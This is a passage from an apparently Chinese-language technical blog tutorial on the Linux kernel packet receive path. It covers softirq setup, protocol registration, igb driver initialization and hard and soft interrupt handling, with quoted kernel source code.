class="hljs-number">0</span>;<br>&#125;<br>early_initcall(spawn_ksoftirqd);<br></code></pre></td></tr></table></figure><p>当ksoftirqd被创建出来以后，它就会进入自己的线程循环函数ksoftirqd_should_run和run_ksoftirqd了。不停地判断有没有软中断需要被处理。这里需要注意的一点是，软中断不仅仅只有网络软中断，还有其它类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: include/linux/interrupt.h</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>    HI_SOFTIRQ=<span class="hljs-number">0</span>,<br>    TIMER_SOFTIRQ,<br>    NET_TX_SOFTIRQ,<br>    NET_RX_SOFTIRQ,<br>    BLOCK_SOFTIRQ,<br>    BLOCK_IOPOLL_SOFTIRQ,<br>    TASKLET_SOFTIRQ,<br>    SCHED_SOFTIRQ,<br>    HRTIMER_SOFTIRQ,<br>    RCU_SOFTIRQ,    <span class="hljs-comment">/* Preferable RCU should always be the last softirq */</span><br><br>    NR_SOFTIRQS<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="2-2-网络子系统初始化"><a href="#2-2-网络子系统初始化" class="headerlink" title="2.2 网络子系统初始化"></a>2.2 网络子系统初始化</h2><p><img src="https://pic3.zhimg.com/80/v2-54e13d378b599612822024c5c224e4f6_1440w.webp" alt="img"></p><p>​                                                                                                         <strong>图4 网络子系统初始化</strong></p><p>linux内核通过调用<code>subsys_initcall</code>来初始化各个子系统，在源代码目录里你可以grep出许多对这个函数的调用。这里我们要说的是网络子系统的初始化，会执行到<code>net_dev_init</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">net_dev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ......<br><br>    for_each_possible_cpu(i) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">softnet_data</span> *<span class="hljs-title">sd</span> =</span> &amp;per_cpu(softnet_data, i);<br><br>        <span class="hljs-built_in">memset</span>(sd, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*sd));<br>        skb_queue_head_init(&amp;sd-&gt;input_pkt_queue);<br>        skb_queue_head_init(&amp;sd-&gt;process_queue);<br>        sd-&gt;completion_queue = <span class="hljs-literal">NULL</span>;<br>        INIT_LIST_HEAD(&amp;sd-&gt;poll_list);<br><br>        ......<br>    &#125;<br><br>    ......<br><br>    open_softirq(NET_TX_SOFTIRQ, net_tx_action);<br>    open_softirq(NET_RX_SOFTIRQ, net_rx_action);<br>&#125;<br>subsys_initcall(net_dev_init);<br></code></pre></td></tr></table></figure><p>在这个函数里，会为每个CPU都申请一个<code>softnet_data</code>数据结构，在这个数据结构里的<code>poll_list</code>是等待驱动程序将其poll函数注册进来，稍后网卡驱动初始化的时候我们可以看到这一过程。</p><p>另外open_softirq注册了每一种软中断都注册一个处理函数。 NET_TX_SOFTIRQ的处理函数为net_tx_action，NET_RX_SOFTIRQ的为net_rx_action。继续跟踪<code>open_softirq</code>后发现这个注册的方式是记录在<code>softirq_vec</code>变量里的。后面ksoftirqd线程收到软中断的时候，也会使用这个变量来找到每一种软中断对应的处理函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: kernel/softirq.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">open_softirq</span><span class="hljs-params">(<span class="hljs-type">int</span> nr, <span class="hljs-type">void</span> (*action)(<span class="hljs-keyword">struct</span> softirq_action *))</span><br>&#123;<br>    softirq_vec[nr].action = action;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-协议栈注册"><a href="#2-3-协议栈注册" class="headerlink" title="2.3 协议栈注册"></a>2.3 协议栈注册</h2><p>内核实现了网络层的ip协议，也实现了传输层的tcp协议和udp协议。 这些协议对应的实现函数分别是ip_rcv(),tcp_v4_rcv()和udp_rcv()。和我们平时写代码的方式不一样的是，内核是通过注册的方式来实现的。 Linux内核中的<code>fs_initcall</code>和<code>subsys_initcall</code>类似，也是初始化模块的入口。<code>fs_initcall</code>调用<code>inet_init</code>后开始网络协议栈注册。 通过<code>inet_init</code>，将这些函数注册到了inet_protos和ptype_base数据结构中了。如下图:</p><p><img src="https://pic4.zhimg.com/80/v2-431d7762a1e574b20d7079534eb51f8f_1440w.webp" alt="img"></p><p>​                                                                                                      <strong>图5 AF_INET协议栈注册</strong></p><p>相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/af_inet.c</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_type</span> <span class="hljs-title">ip_packet_type</span> __<span class="hljs-title">read_mostly</span> =</span> &#123;<br>    .type = cpu_to_be16(ETH_P_IP),<br>    .func = ip_rcv,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_protocol</span> <span class="hljs-title">udp_protocol</span> =</span> &#123;<br>    .handler =  udp_rcv,<br>    .err_handler =  udp_err,<br>    .no_policy =    <span class="hljs-number">1</span>,<br>    .netns_ok = <span class="hljs-number">1</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_protocol</span> <span class="hljs-title">tcp_protocol</span> =</span> &#123;<br>    .early_demux    =   tcp_v4_early_demux,<br>    .handler    =   tcp_v4_rcv,<br>    .err_handler    =   tcp_v4_err,<br>    .no_policy  =   <span class="hljs-number">1</span>,<br>    .netns_ok   =   <span class="hljs-number">1</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ......<br><br>    <span class="hljs-keyword">if</span> (inet_add_protocol(&amp;icmp_protocol, IPPROTO_ICMP) &lt; <span class="hljs-number">0</span>)<br>        pr_crit(<span class="hljs-string">&quot;%s: Cannot add ICMP protocol\n&quot;</span>, __func__);<br>    <span class="hljs-keyword">if</span> (inet_add_protocol(&amp;udp_protocol, IPPROTO_UDP) &lt; <span class="hljs-number">0</span>)<br>        pr_crit(<span class="hljs-string">&quot;%s: Cannot add UDP protocol\n&quot;</span>, __func__);<br>    <span class="hljs-keyword">if</span> (inet_add_protocol(&amp;tcp_protocol, IPPROTO_TCP) &lt; <span class="hljs-number">0</span>)<br>        pr_crit(<span class="hljs-string">&quot;%s: Cannot add TCP protocol\n&quot;</span>, __func__);<br><br>    ......<br><br>    dev_add_pack(&amp;ip_packet_type);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码中我们可以看到，udp_protocol结构体中的handler是udp_rcv，tcp_protocol结构体中的handler是tcp_v4_rcv，通过inet_add_protocol被初始化了进来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">inet_add_protocol</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> net_protocol *prot, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> protocol)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!prot-&gt;netns_ok) &#123;<br>        pr_err(<span class="hljs-string">&quot;Protocol %u is not namespace aware, cannot register.\n&quot;</span>,<br>            protocol);<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> !cmpxchg((<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> net_protocol **)&amp;inet_protos[protocol],<br>            <span class="hljs-literal">NULL</span>, prot) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>inet_add_protocol</code>函数将tcp和udp对应的处理函数都注册到了inet_protos数组中了。再看<code>dev_add_pack(&amp;ip_packet_type);</code>这一行，ip_packet_type结构体中的type是协议名，func是ip_rcv函数，在dev_add_pack中会被注册到ptype_base哈希表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">dev_add_pack</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> packet_type *pt)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">head</span> =</span> ptype_head(pt);<br>    ......<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> list_head *<span class="hljs-title function_">ptype_head</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> packet_type *pt)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (pt-&gt;type == htons(ETH_P_ALL))<br>        <span class="hljs-keyword">return</span> &amp;ptype_all;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> &amp;ptype_base[ntohs(pt-&gt;type) &amp; PTYPE_HASH_MASK];<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们需要记住<strong>inet_protos记录着udp，tcp的处理函数地址，ptype_base存储着ip_rcv()函数的处理地址</strong>。后面我们会看到软中断中会通过ptype_base找到ip_rcv函数地址，进而将ip包正确地送到ip_rcv()中执行。在ip_rcv中将会通过inet_protos找到tcp或者udp的处理函数，再而把包转发给udp_rcv()或tcp_v4_rcv()函数。</p><p>扩展一下，如果看一下ip_rcv和udp_rcv等函数的代码能看到很多协议的处理过程。例如，ip_rcv中会处理netfilter和iptable过滤，如果你有很多或者很复杂的 netfilter 或 iptables 规则，这些规则都是在软中断的上下文中执行的，会加大网络延迟。再例如，udp_rcv中会判断socket接收队列是否满了。对应的相关内核参数是net.core.rmem_max和net.core.rmem_default。如果有兴趣，建议大家好好读一下<code>inet_init</code>这个函数的代码。</p><h2 id="2-4-网卡驱动初始化"><a href="#2-4-网卡驱动初始化" class="headerlink" title="2.4 网卡驱动初始化"></a>2.4 网卡驱动初始化</h2><p>每一个驱动程序（不仅仅只是网卡驱动）会使用 module_init 向内核注册一个初始化函数，当驱动被加载时，内核会调用这个函数。比如igb网卡驱动的代码位于<code>drivers/net/ethernet/intel/igb/igb_main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: drivers/net/ethernet/intel/igb/igb_main.c</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">igb_driver</span> =</span> &#123;<br>    .name     = igb_driver_name,<br>    .id_table = igb_pci_tbl,<br>    .probe    = igb_probe,<br>    .remove   = igb_remove,<br>    ......<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">igb_init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ......<br>    ret = pci_register_driver(&amp;igb_driver);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>驱动的<code>pci_register_driver</code>调用完成后，Linux内核就知道了该驱动的相关信息，比如igb网卡驱动的<code>igb_driver_name</code>和<code>igb_probe</code>函数地址等等。当网卡设备被识别以后，内核会调用其驱动的probe方法（igb_driver的probe方法是igb_probe）。驱动probe方法执行的目的就是让设备ready，对于igb网卡，其<code>igb_probe</code>位于drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;igb&#x2F;igb_main.c下。主要执行的操作如下：</p><p><img src="https://pic3.zhimg.com/80/v2-35997da4b5e2bd66cd3af9ad538eca8a_1440w.webp" alt="img"></p><p>​                                                                                                       <strong>图6 网卡驱动初始化</strong></p><p>第5步中我们看到，网卡驱动实现了ethtool所需要的接口，也在这里注册完成函数地址的注册。当 ethtool 发起一个系统调用之后，内核会找到对应操作的回调函数。对于igb网卡来说，其实现函数都在drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;igb&#x2F;igb_ethtool.c下。 相信你这次能彻底理解ethtool的工作原理了吧？ 这个命令之所以能查看网卡收发包统计、能修改网卡自适应模式、能调整RX 队列的数量和大小，是因为ethtool命令最终调用到了网卡驱动的相应方法，而不是ethtool本身有这个超能力。</p><p>第6步注册的igb_netdev_ops中包含的是igb_open等函数，该函数在网卡被启动的时候会被调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: drivers/net/ethernet/intel/igb/igb_main.c</span><br>......<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device_ops</span> <span class="hljs-title">igb_netdev_ops</span> =</span> &#123;<br>  .ndo_open               = igb_open,<br>  .ndo_stop               = igb_close,<br>  .ndo_start_xmit         = igb_xmit_frame,<br>  .ndo_get_stats64        = igb_get_stats64,<br>  .ndo_set_rx_mode        = igb_set_rx_mode,<br>  .ndo_set_mac_address    = igb_set_mac,<br>  .ndo_change_mtu         = igb_change_mtu,<br>  .ndo_do_ioctl           = igb_ioctl,......<br></code></pre></td></tr></table></figure><p>第7步中，在igb_probe初始化过程中，还调用到了<code>igb_alloc_q_vector</code>。他注册了一个NAPI机制所必须的poll函数，对于igb网卡驱动来说，这个函数就是igb_poll,如下代码所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">igb_alloc_q_vector</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> igb_adapter *adapter,</span><br><span class="hljs-params">                  <span class="hljs-type">int</span> v_count, <span class="hljs-type">int</span> v_idx,</span><br><span class="hljs-params">                  <span class="hljs-type">int</span> txr_count, <span class="hljs-type">int</span> txr_idx,</span><br><span class="hljs-params">                  <span class="hljs-type">int</span> rxr_count, <span class="hljs-type">int</span> rxr_idx)</span><br>&#123;<br><br>    ......<br>    <span class="hljs-comment">/* initialize NAPI */</span><br>    netif_napi_add(adapter-&gt;netdev, &amp;q_vector-&gt;napi,<br>               igb_poll, <span class="hljs-number">64</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-启动网卡"><a href="#2-5-启动网卡" class="headerlink" title="2.5 启动网卡"></a>2.5 启动网卡</h2><p>当上面的初始化都完成以后，就可以启动网卡了。回忆前面网卡驱动初始化时，我们提到了驱动向内核注册了 structure net_device_ops 变量，它包含着网卡启用、发包、设置mac 地址等回调函数（函数指针）。当启用一个网卡时（例如，通过 ifconfig eth0 up），net_device_ops 中的 igb_open方法会被调用。它通常会做以下事情：</p><p><img src="https://pic3.zhimg.com/80/v2-f3bc29ac6d669c9d3e7d588c0e24494a_1440w.webp" alt="img"></p><p>​                                                                                                             <strong>图7 启动网卡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: drivers/net/ethernet/intel/igb/igb_main.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __igb_open(<span class="hljs-keyword">struct</span> net_device *netdev, <span class="hljs-type">bool</span> resuming)<br>&#123;<br>    <span class="hljs-comment">/* allocate transmit descriptors */</span><br>    err = igb_setup_all_tx_resources(adapter);<br><br>    <span class="hljs-comment">/* allocate receive descriptors */</span><br>    err = igb_setup_all_rx_resources(adapter);<br><br>    <span class="hljs-comment">/* 注册中断处理函数 */</span><br>    err = igb_request_irq(adapter);<br>    <span class="hljs-keyword">if</span> (err)<br>        <span class="hljs-keyword">goto</span> err_req_irq;<br><br>    <span class="hljs-comment">/* 启用NAPI */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; adapter-&gt;num_q_vectors; i++)<br>        napi_enable(&amp;(adapter-&gt;q_vector[i]-&gt;napi));<br><br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面<code>__igb_open</code>函数调用了igb_setup_all_tx_resources,和igb_setup_all_rx_resources。在<code>igb_setup_all_rx_resources</code>这一步操作中，分配了RingBuffer，并建立内存和Rx队列的映射关系。（Rx Tx 队列的数量和大小可以通过 ethtool 进行配置）。我们再接着看中断函数注册<code>igb_request_irq</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">igb_request_irq</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> igb_adapter *adapter)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (adapter-&gt;msix_entries) &#123;<br>        err = igb_request_msix(adapter);<br>        <span class="hljs-keyword">if</span> (!err)<br>            <span class="hljs-keyword">goto</span> request_done;<br>        ......<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">igb_request_msix</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> igb_adapter *adapter)</span><br>&#123;<br>    ......<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; adapter-&gt;num_q_vectors; i++) &#123;<br>        ...<br>        err = request_irq(adapter-&gt;msix_entries[<span class="hljs-built_in">vector</span>].<span class="hljs-built_in">vector</span>,<br>                  igb_msix_ring, <span class="hljs-number">0</span>, q_vector-&gt;name,<br>    &#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中跟踪函数调用， <code>__igb_open</code> &#x3D;&gt; <code>igb_request_irq</code> &#x3D;&gt; <code>igb_request_msix</code>, 在<code>igb_request_msix</code>中我们看到了，对于多队列的网卡，为每一个队列都注册了中断，其对应的中断处理函数是igb_msix_ring（该函数也在drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;igb&#x2F;igb_main.c下）。 我们也可以看到，msix方式下，每个 RX 队列有独立的MSI-X 中断，从网卡硬件中断的层面就可以设置让收到的包被不同的 CPU处理。（可以通过 irqbalance ，或者修改 &#x2F;proc&#x2F;irq&#x2F;IRQ_NUMBER&#x2F;smp_affinity能够修改和CPU的绑定行为）。</p><p>当做好以上准备工作以后，就可以开门迎客（数据包）了！</p><h2 id="三、迎接数据的到来"><a href="#三、迎接数据的到来" class="headerlink" title="三、迎接数据的到来"></a>三、迎接数据的到来</h2><h2 id="3-1-硬中断处理"><a href="#3-1-硬中断处理" class="headerlink" title="3.1 硬中断处理"></a>3.1 硬中断处理</h2><p>首先当数据帧从网线到达网卡上的时候，第一站是网卡的接收队列。网卡在分配给自己的RingBuffer中寻找可用的内存位置，找到后DMA引擎会把数据DMA到网卡之前关联的内存里，这个时候CPU都是无感的。当DMA操作完成以后，网卡会像CPU发起一个硬中断，通知CPU有数据到达。</p><p><img src="https://pic2.zhimg.com/80/v2-bc98b12bd9724efbc8180bbe3fe17259_1440w.webp" alt="img"></p><p>​                                                                                                   <strong>图8 网卡数据硬中断处理过程</strong></p><blockquote><p>注意：当RingBuffer满的时候，新来的数据包将给丢弃。ifconfig查看网卡的时候，可以里面有个overruns，表示因为环形队列满被丢弃的包。如果发现有丢包，可能需要通过ethtool命令来加大环形队列的长度。</p></blockquote><p>在启动网卡一节，我们说到了网卡的硬中断注册的处理函数是igb_msix_ring。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: drivers/net/ethernet/intel/igb/igb_main.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">irqreturn_t</span> <span class="hljs-title function_">igb_msix_ring</span><span class="hljs-params">(<span class="hljs-type">int</span> irq, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">igb_q_vector</span> *<span class="hljs-title">q_vector</span> =</span> data;<br><br>    <span class="hljs-comment">/* Write the ITR value calculated from the previous interrupt. */</span><br>    igb_write_itr(q_vector);<br><br>    napi_schedule(&amp;q_vector-&gt;napi);<br><br>    <span class="hljs-keyword">return</span> IRQ_HANDLED;<br>&#125;<br>igb_write_itr`只是记录一下硬件中断频率（据说目的是在减少对CPU的中断频率时用到）。顺着napi_schedule调用一路跟踪下去，`__napi_schedule`=&gt;`____napi_schedule<br><span class="hljs-comment">/* Called with irq disabled */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> ____napi_schedule(<span class="hljs-keyword">struct</span> softnet_data *sd,<br>                     <span class="hljs-keyword">struct</span> napi_struct *napi)<br>&#123;<br>    list_add_tail(&amp;napi-&gt;poll_list, &amp;sd-&gt;poll_list);<br>    __raise_softirq_irqoff(NET_RX_SOFTIRQ);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们看到，<code>list_add_tail</code>修改了CPU变量softnet_data里的poll_list，将驱动napi_struct传过来的poll_list添加了进来。 其中softnet_data中的poll_list是一个双向列表，其中的设备都带有输入帧等着被处理。紧接着<code>__raise_softirq_irqoff</code>触发了一个软中断NET_RX_SOFTIRQ， 这个所谓的触发过程只是对一个变量进行了一次或运算而已。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __raise_softirq_irqoff(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)<br>&#123;<br>    trace_softirq_raise(nr);<br>    or_softirq_pending(<span class="hljs-number">1UL</span> &lt;&lt; nr);<br>&#125;<br><span class="hljs-comment">//file: include/linux/irq_cpustat.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> or_softirq_pending(x)  (local_softirq_pending() |= (x))</span><br></code></pre></td></tr></table></figure><p>我们说过，Linux在硬中断里只完成简单必要的工作，剩下的大部分的处理都是转交给软中断的。通过上面代码可以看到，硬中断处理过程真的是非常短。只是记录了一个寄存器，修改了一下下CPU的poll_list，然后发出个软中断。就这么简单，硬中断工作就算是完成了。</p><h2 id="3-2-ksoftirqd内核线程处理软中断"><a href="#3-2-ksoftirqd内核线程处理软中断" class="headerlink" title="3.2 ksoftirqd内核线程处理软中断"></a>3.2 ksoftirqd内核线程处理软中断</h2><p><img src="https://pic1.zhimg.com/80/v2-a700d562d51ebe3f1de9c005e42887b0_1440w.webp" alt="img"></p><p>​                                                                                                    <strong>图9 ksoftirqd内核线程</strong></p><p>内核线程初始化的时候，我们介绍了ksoftirqd中两个线程函数<code>ksoftirqd_should_run</code>和<code>run_ksoftirqd</code>。其中<code>ksoftirqd_should_run</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ksoftirqd_should_run</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> local_softirq_pending();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> local_softirq_pending() \</span><br><span class="hljs-meta">    __IRQ_STAT(smp_processor_id(), __softirq_pending)</span><br></code></pre></td></tr></table></figure><p>这里看到和硬中断中调用了同一个函数<code>local_softirq_pending</code>。使用方式不同的是硬中断位置是为了写入标记，这里仅仅只是读取。如果硬中断中设置了<code>NET_RX_SOFTIRQ</code>,这里自然能读取的到。接下来会真正进入线程函数中<code>run_ksoftirqd</code>处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run_ksoftirqd</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu)</span><br>&#123;<br>    local_irq_disable();<br>    <span class="hljs-keyword">if</span> (local_softirq_pending()) &#123;<br>        __do_softirq();<br>        rcu_note_context_switch(cpu);<br>        local_irq_enable();<br>        cond_resched();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    local_irq_enable();<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>__do_softirq</code>中，判断根据当前CPU的软中断类型，调用其注册的action方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 